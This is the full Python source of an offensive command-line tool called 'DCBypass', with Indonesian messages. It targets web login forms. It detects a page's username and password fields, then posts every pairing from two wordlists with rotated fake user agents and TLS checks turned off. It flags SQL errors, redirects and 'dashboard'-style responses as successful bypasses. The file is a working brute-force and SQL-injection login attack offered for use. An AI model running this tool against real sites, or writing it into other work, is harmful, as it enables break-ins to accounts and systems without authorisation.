import argparse
import requests
from bs4 import BeautifulSoup
from urllib.parse import urljoin
import os
import re
import sys
import urllib3
from rich.console import Console
from difflib import SequenceMatcher
import threading
import random
import time
from concurrent.futures import ThreadPoolExecutor

#Color
RED = "\033[91m"
END = '\033[0m'
GREEN = "\033[92m"
BLUE = "\033[94m"


urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
console = Console()

console = Console()

if sys.version_info[0] == 2:
    input = raw_input
    from urlparse import urlparse
else:
    from urllib.parse import urlparse

    ascii_art = RED + r"""

      ____   ____ _                               
     |  _ \ / ___| |__  _   _ _ __   __ _ ___ ___ 
     | | | | |   | '_ \| | | | '_ \ / _` / __/ __|
     | |_| | |___| |_) | |_| | |_) | (_| \__ \__ \
     |____/ \____|_.__/ \__, | .__/ \__,_|___/___/
                        |___/|_|     by: NantzzSec           
""" + END
    info = RED + """
Tools   : DCBypass                    
Created : NantzzSec                   
Github  : https://github.com/nantzzsec
""" + END

    print(ascii_art)
    print(info)

def is_same_page(content1, content2, threshold=0.95):
    matcher = SequenceMatcher(None, content1, content2)
    similarity = matcher.ratio()
    return similarity > threshold

DEFAULT_USERNAME_WORDLIST = "wordlist/username.txt"
DEFAULT_PASSWORD_WORDLIST = "wordlist/pass.txt"

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:89.0) Gecko/20100101 Firefox/89.0",
    "Mozilla/5.0 (X11; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/91.0.864.59",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0"
]

console_lock = threading.Lock()

def get_random_user_agent():
    return random.choice(USER_AGENTS)

def extract_form_fields_from_html(url):
    try:
        headers = {"User-Agent": get_random_user_agent()}
        response = requests.get(url, headers=headers, verify=False, timeout=10)
        soup = BeautifulSoup(response.text, 'html.parser')

        form = soup.find("form")
        inputs = form.find_all("input") if form else []

        uname_field = None
        pass_field = None

        for input_field in inputs:
            field_type = input_field.get("type", "").lower()
            name_attr = input_field.get("name", "")

            if field_type == "text" and not uname_field:
                uname_field = name_attr
            elif field_type == "password" and not pass_field:
                pass_field = name_attr

        return uname_field, pass_field
    except Exception as e:
        with console_lock:
            console.print(f"[bright_red][-] Gagal ekstrak field dari URL: {e}[/bright_red]")
        return None, None

def test_payload(username_payload, password_payload, url, uname_field, pass_field, success_payloads, login_fingerprint):
    headers = {"User-Agent": get_random_user_agent()}
    
    data = {
        uname_field: username_payload,
        pass_field: password_payload
    }

    try:
        s = requests.Session()
        response = s.post(url, data=data, headers=headers, allow_redirects=False, verify=False, timeout=10)
        content = response.text.lower()
        found_keywords = any(k in content for k in ["login success", "logout", "welcome", "dashboard", "berhasil login"])

        payload_display = f"username={username_payload}&password={password_payload}"

        is_success = False
        
        with console_lock:
            if response.status_code == 200:
                if "sql syntax" in content or "mysql_fetch" in content or "you have an error in your sql" in content:
                    console.print(f"[!] payload > [green]'{payload_display}'[/green] [yellow] Status: 200 OK (SQL Syntax Error)[/yellow]")
                    success_payloads.append(payload_display)
                    is_success = True
                elif found_keywords:
                    console.print(f"[+] payload > [green]'{payload_display}'[/green] [green] Status: 200 OK (Login Success Keyword)[/green]")
                    success_payloads.append(payload_display)
                    is_success = True
                elif not is_same_page(content, login_fingerprint):
                    console.print(f"[+] payload > [green]'{payload_display}'[/green] [bright_green] Status: 200 OK (Pindah halaman - Login berhasil!)[/bright_green]")
                    success_payloads.append(payload_display)
                    is_success = True
                
            elif response.status_code in [301, 302, 303, 307, 308]:
                location = response.headers.get("Location", "Unknown")
                console.print(f"[+] payload > [green]'{payload_display}'[/green] [purple] Status: {response.status_code} - Redirected! (Location: {location})[/purple]")
                success_payloads.append(payload_display)
                is_success = True
            
            
    except Exception as e:
        pass

def test_payload_wrapper(args):
    username_payload, password_payload, url, uname_field, pass_field, success_payloads, login_fingerprint = args
    test_payload(username_payload, password_payload, url, uname_field, pass_field, success_payloads, login_fingerprint)
    time.sleep(0.1)

def parse_request_file(filepath):
    with open(filepath, "r") as file:
        lines = file.read().splitlines()

    request_line = lines[0]
    method, path, _ = request_line.split()

    headers = {}
    body = ""
    is_body = False
    for line in lines[1:]:
        if line == "":
            is_body = True
            continue
        if is_body:
            body += line
        else:
            key, value = line.split(":", 1)
            headers[key.strip()] = value.strip()

    scheme = "http"
    if "https" in headers.get("Origin", ""):
        scheme = "https"
    url = f"{scheme}://{headers['Host']}{path}"

    return method, url, headers, body

def main():
    parser = argparse.ArgumentParser()
    group = parser.add_mutually_exclusive_group(required=True)
    group.add_argument("-r", "--request", help="File HTTP request (format Burp Suite)")
    group.add_argument("-u", "--url", help="Target URL halaman login")

    parser.add_argument("-U", "--username-wordlist", help="Username wordlist file. Default: wordlist/username.txt")
    parser.add_argument("-P", "--password-wordlist", help="Password wordlist file. Default: wordlist/password.txt")
    parser.add_argument("-N", "--name", help="Nama parameter username (optional jika otomatis)")
    parser.add_argument("-S", "--passparam", help="Nama parameter password (optional jika otomatis)")
    
    parser.add_argument("-t", "--thread", type=int, choices=range(1, 6), default=1, 
                       help="Jumlah thread (1-5). Default: 1")

    args = parser.parse_args()

    username_wordlist_path = args.username_wordlist if args.username_wordlist else DEFAULT_USERNAME_WORDLIST
    password_wordlist_path = args.password_wordlist if args.password_wordlist else DEFAULT_PASSWORD_WORDLIST

    if not args.username_wordlist:
        console.print(f"[bright_green]================================================================[/bright_green]")
        console.print(f"[bright_green][~][/bright_green] Username wordlist    : [bright_green] {username_wordlist_path}[/bright_green]")
    if not args.password_wordlist:
        console.print(f"[bright_green][~][/bright_green] Password wordlist    : [bright_green] {password_wordlist_path}[/bright_green]")

    if not os.path.exists(username_wordlist_path):
        console.print(f"[bright_red][-][/bright_red] Username wordlist    : [bright_red] Not Found! {username_wordlist_path}[/bright_red]")
        return

    if not os.path.exists(password_wordlist_path):
        console.print(f"[bright_red][-][/bright_red] Password wordlist    : [bright_red] Not Found! {password_wordlist_path}[/bright_red]")
        return

    uname_field = args.name
    pass_field = args.passparam
    thread_count = args.thread

    console.print(f"[bright_green][~][/bright_green] Thread Use           : [bright_green] {thread_count} thread(s)[/bright_green]")
    console.print(f"[bright_green]================================================================[/bright_green]")
    if args.url:
        url = args.url

        if not uname_field or not pass_field:
            console.print(f"[bright_blue][~] Mendeteksi parameter input dari halaman login...[/bright_blue]")
            uname_field, pass_field = extract_form_fields_from_html(url)

            if not uname_field or not pass_field:
                console.print(f"[bright_red][-] Gagal mendeteksi input username/password dari form HTML![/bright_red]")
                return
            else:
                console.print(f"[bright_green][+][/bright_green] Ditemukan field        :[bright_green] username='{uname_field}', password='{pass_field}'[/bright_green]")

    elif args.request:
        method, url, headers, body = parse_request_file(args.request)
        from urllib.parse import parse_qs
        params = parse_qs(body)

        if not uname_field or not pass_field:
            uname_field = list(params.keys())[0]
            pass_field = list(params.keys())[1] if len(params) > 1 else uname_field

        console.print(f"{BLUE}[~] Diperoleh URL dari request: {url}[END]")

    login_fingerprint = ""
    try:
        headers = {"User-Agent": get_random_user_agent()}
        resp_fingerprint = requests.get(url, headers=headers, verify=False)
        if resp_fingerprint.status_code == 200:
            login_fingerprint = resp_fingerprint.text.lower()
    except Exception as e:
        console.print(f"[bright_red][-] Gagal mengambil halaman login: {e}[/bright_red]")
        sys.exit(1)

    console.print(f"[bright_blue][~][/bright_blue] Memulai brute force ke : {url} dengan field:[bright_blue] '{uname_field}' dan '{pass_field}'[/bright_blue]")

    with open(username_wordlist_path, "r") as f:
        username_payloads = [line.strip() for line in f if line.strip()]

    with open(password_wordlist_path, "r") as f:
        password_payloads = [line.strip() for line in f if line.strip()]

    total_combinations = len(username_payloads) * len(password_payloads)
    console.print(f"[bright_blue][~][/bright_blue] Total username payloads:[bright_blue] {len(username_payloads)}[/bright_blue]")
    console.print(f"[bright_blue][~][/bright_blue] Total password payloads:[bright_blue] {len(password_payloads)}[/bright_blue]")
    console.print(f"[bright_blue][~][/bright_blue] Total kombinasi payload:[bright_blue] {total_combinations}[/bright_blue]")
    console.print(f"[bright_green]================================================================[/bright_green]")

    success_payloads = []
    
    payload_combinations = []
    for username_payload in username_payloads:
        for password_payload in password_payloads:
            payload_combinations.append((username_payload, password_payload, url, uname_field, pass_field, success_payloads, login_fingerprint))

    try:
        if thread_count == 1:
            for combination in payload_combinations:
                test_payload_wrapper(combination)
        else:
            with ThreadPoolExecutor(max_workers=thread_count) as executor:
                executor.map(test_payload_wrapper, payload_combinations)
                
    except KeyboardInterrupt:
        console.print("\n[bright_red]^C CTRL+C Detected! Canceling....[/bright_red]")
        sys.exit(0)

    if success_payloads:
        console.print(f"\n[green]Total {len(success_payloads)} payload berhasil:[/green]")
        for p in success_payloads:
            console.print(f"[green][+] '{p}'[/green]")
    else:
        console.print(f"\n[bright_red]Tidak ada payload yang berhasil.[/bright_red]")

if __name__ == "__main__":
    main()
